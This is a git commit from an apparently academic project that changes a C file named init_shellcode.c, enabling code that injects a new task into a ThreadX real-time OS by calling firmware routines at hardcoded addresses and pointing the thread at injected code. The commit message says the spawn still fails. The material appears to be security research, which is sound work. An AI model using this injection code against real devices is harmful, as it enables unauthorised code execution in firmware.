a52830662e0f8dca05e5680fdbbdde7ab5cf4431
Eduard Vlad <eduard.vlad@epfl.ch>
2025-12-17 15:49:54 +0000

    now working with asserts from threadx
    (failing to spawn a task but at least)
    
    Signed-off-by: Eduard Vlad <eduard.vlad@epfl.ch>

--- c-based/init_shellcode.c
+++ c-based/init_shellcode.c
@@ -69,57 +69,62 @@ void do_stuff () {
 #define OFFSET_START_CODE 0xE3A20C
 // HACK: just put it at offset 200 and update 
 // because we cannot get linking to work that easily
-#define OFFSET_INTO_CODE 0x174
+#define OFFSET_INTO_CODE 0x260
 
 // Inject a task into Threadx
 __attribute__((naked))
 void init_task() {
 	// PROLOGUE
-      store_context_and_lr();
- //   make_space_stack();
-//
-   spipe_write_t writefn = (spipe_write_t)(void*)SPIPE_WRITE_ADDR;
-   spawn_threadx_thread spawn = (spawn_threadx_thread)(void*)(0x8f829fe6 | 1);
-//
-//   char *tname = "HEX_TASK";
-//   char *qname = "HEX_Q";
-//
-   writefn(9, "ABOUT TO INJECT:\n", 18, 0);
-//   
-//   // Need to hardcode it since we dont know where we are injected
-//   // It will be do_stuff (0x9065A20C)
-//   void* CUST_TASK = (void*)(REBASE + OFFSET_START_CODE + OFFSET_INTO_CODE);
-//
-//   // Some args...
-//   int stack_size      = 0x800; 
-//   int extra_words    = 0;
-//   // int priority_or_id = 0xCA;
-//   int preempt_thr    = 1;
-//   int  time_slice     = 1;
-//   int  auto_start     = 1;
-//
-	int idx = 0x1337;
-//   // int idx = spawn(
-//   //     tname,
-//   //     qname,
-//   //     CUST_TASK,
-//   //     0,
-//   //     0, //????
-//   //     stack_size,
-//   //     extra_words,
-//   //     preempt_thr,
-//   //     time_slice,
-//   //     auto_start
-//   // );
-    writefn(9, "THREAD START:\n", 15, 0);
-    writefn(9, (char*)&idx,4, 0);
-    writefn(9, "THREAD OK!", 11, 0);
+	store_context_and_lr();
+	make_space_stack();
 
-//   // EPILOGUE
-//   
-//    restore_space_stack();
-    restore_context_no_lr();
-    ret();
+	spipe_write_t writefn = (spipe_write_t)(void*)SPIPE_WRITE_ADDR;
+	spawn_threadx_thread spawn = (spawn_threadx_thread)(void*)(0x8f829fe6 | 1);
+
+	char *tname = "HEX_TASK";
+	char *qname = "HEX_Q";
+
+	writefn(9, "TASK TO INJECT=", 18, 0);
+	writefn(9, tname, 8, 0);
+	writefn(9, "QUEUE=", 6, 0);
+	writefn(9, qname, 5, 0);
+
+  
+	// Need to hardcode it since we dont know where we are injected
+	// It will be do_stuff (0x9065A20C)
+	void* CUST_TASK = (void*)(REBASE + OFFSET_START_CODE + OFFSET_INTO_CODE);
+
+
+	// Some args...
+	int stack_size      = 0x800; 
+	int extra_words    = 0;
+	// int priority_or_id = 0xCA;
+	int preempt_thr    = 1;
+	int  time_slice     = 1;
+	int  auto_start     = 1;
+
+	//int idx = 0x1337;
+	int idx = spawn(
+	    tname,
+	    qname,
+	    CUST_TASK,
+	    0,
+	    0, //????
+	    stack_size,
+	    extra_words,
+	    preempt_thr,
+	    time_slice,
+	    auto_start
+	);
+
+	writefn(9, "THREAD START:\n", 15, 0);
+	writefn(9, (char*)&idx,4, 0);
+	writefn(9, "THREAD OK!", 11, 0);
+
+	// EPILOGUE
+	restore_space_stack();
+	restore_context_no_lr();
+	ret();
 }
 
 __attribute__((section(".text.task_entry"), used))
